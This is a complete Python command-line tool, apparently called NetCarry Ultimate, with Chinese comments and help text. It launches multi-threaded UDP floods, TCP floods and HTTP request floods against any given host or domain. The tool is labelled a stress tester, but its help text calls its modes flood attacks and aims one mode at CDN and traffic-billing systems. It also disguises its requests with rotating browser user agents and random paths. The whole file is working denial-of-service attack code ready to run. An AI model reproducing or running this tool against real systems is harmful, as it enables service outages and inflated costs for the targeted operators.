#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import random
import argparse
import sys
import ssl

# 视觉色彩定义
C_PURPLE = '\033[95m'
C_CYAN = '\033[96m'
C_YELLOW = '\033[93m'
C_RED = '\033[91m'
C_END = '\033[0m'
C_BOLD = '\033[1m'

BANNER = f"""
{C_PURPLE}{C_BOLD}
   _  ____________________   ___  _____  __
  / |/ / __/_  __/ ___/ _ | / _ \/ _ \ \/ /
 /    / _/  / / / /__/ __ |/ , _/ , _/\  / 
/_/|_/___/ /_/  \___/_/ |_/_/|_/_/|_| /_/  
                                           
{C_CYAN} >> NEON STRESS ULTIMATE V6.0 - CLI HYBRID SYSTEM <<
{C_END}"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

class NetCarryEngine:
    def __init__(self, args):
        self.target = args.target
        self.port = args.port
        self.threads = args.threads
        self.mode = args.mode.upper()
        self.duration = args.duration
        self.payload_size = int(args.size * 1024 * 1024)
        
        self.is_running = True
        self.total_bytes = 0
        self.count = 0
        self.start_time = 0

        # DNS 解析
        try:
            self.target_ip = socket.gethostbyname(self.target)
        except Exception as e:
            print(f"{C_RED}[!] DNS解析错误: {e}{C_END}")
            sys.exit(1)

    def get_http_header(self):
        """构造模拟真实请求的 HTTP 头部 (用于 CC 和 BRUSH)"""
        path = f"/{random.randint(1, 99999)}?s={random.random()}"
        header = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Connection: keep-alive\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n\r\n"
        )
        return header.encode()

    def udp_flood(self):
        data = random._urandom(min(self.payload_size, 65500))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.is_running:
            try:
                sock.sendto(data, (self.target_ip, self.port))
                self.total_bytes += len(data)
                self.count += 1
            except: pass

    def tcp_flood(self):
        data = random._urandom(min(self.payload_size, 1048576))
        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((self.target_ip, self.port))
                    while self.is_running:
                        s.send(data)
                        self.total_bytes += len(data)
                        self.count += 1
            except: break

    def cc_brush_flood(self):
        """CC/域名刷流：建立连接并发送大量 HTTP GET 请求"""
        # 自动判断是否需要 SSL (端口443通常为HTTPS)
        use_ssl = True if self.port == 443 else False
        
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                if use_ssl:
                    context = ssl.create_default_context()
                    # 绕过证书验证以提高速度
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=self.target)
                
                s.connect((self.target_ip, self.port))
                # 在同一个连接中刷多个请求 (Keep-Alive)
                for _ in range(30):
                    if not self.is_running: break
                    payload = self.get_http_header()
                    s.send(payload)
                    self.total_bytes += len(payload)
                    self.count += 1
                s.close()
            except:
                try: s.close()
                except: pass

    def monitor(self):
        self.start_time = time.time()
        while self.is_running:
            elapsed = time.time() - self.start_time
            if elapsed >= self.duration:
                self.is_running = False
                break
            
            # 计算统计数据
            mb_sent = self.total_bytes / 1048576
            speed = mb_sent / elapsed if elapsed > 0 else 0
            
            # 动态刷新控制台输出
            out = f"\r{C_YELLOW}[运行中]{C_END} 模式: {self.mode} | 发送: {mb_sent:.2f} MB | 速度: {speed:.2f} MB/s | 请求数: {self.count}"
            sys.stdout.write(out)
            sys.stdout.flush()
            time.sleep(0.5)
        print(f"\n{C_CYAN}[*] 任务完成。平均速度: {(self.total_bytes/1048576)/elapsed:.2f} MB/s{C_END}")

    def run(self):
        print(BANNER)
        print(f"{C_BOLD}目标: {C_PURPLE}{self.target}{C_END} ({self.target_ip})")
        print(f"{C_BOLD}端口: {C_PURPLE}{self.port}{C_END} | 线程: {C_PURPLE}{self.threads}{C_END} | 模式: {C_PURPLE}{self.mode}{C_END}")
        print(f"{C_CYAN}----------------------------------------------------------{C_END}")

        # 启动监控
        threading.Thread(target=self.monitor, daemon=True).start()

        # 启动发包线程
        thread_list = []
        for _ in range(self.threads):
            if self.mode == "UDP":
                func = self.udp_flood
            elif self.mode == "TCP":
                func = self.tcp_flood
            else: # CC 或 BRUSH
                func = self.cc_brush_flood
            
            t = threading.Thread(target=func, daemon=True)
            t.start()
            thread_list.append(t)

        # 等待所有线程
        while self.is_running:
            time.sleep(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="NetCarry Ultimate - 高性能网络压力测试工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{C_CYAN}模式指南:{C_END}
  {C_BOLD}UDP{C_END}    : 基础 UDP 洪水攻击，适合针对带宽。
  {C_BOLD}TCP{C_END}    : TCP 数据流喷射，适合针对端口服务。
  {C_BOLD}CC{C_END}     : 模拟真实 HTTP/S 请求，针对网站应用层。
  {C_BOLD}BRUSH{C_END}  : 域名高频刷流，针对 CDN 和 流量计费系统。

{C_CYAN}使用示例:{C_END}
  netcarry www.example.com -m CC -t 500 -d 300
  netcarry 1.1.1.1 -p 53 -m UDP -t 1000
        """
    )
    parser.add_argument("target", help="目标 IP 或 域名")
    parser.add_argument("-p", "--port", type=int, default=80, help="目标端口 (默认: 80)")
    parser.add_argument("-t", "--threads", type=int, default=128, help="并发线程数 (默认: 128)")
    parser.add_argument("-m", "--mode", choices=["UDP", "TCP", "CC", "BRUSH"], default="UDP", help="压测模式")
    parser.add_argument("-s", "--size", type=float, default=1.0, help="单次载荷大小 MiB (针对 TCP/UDP)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="持续时间 (秒)")

    if len(sys.argv) == 1:
        print(BANNER)
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()
    try:
        engine = NetCarryEngine(args)
        engine.run()
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!] 用户强制停止。{C_END}")
        sys.exit(0)
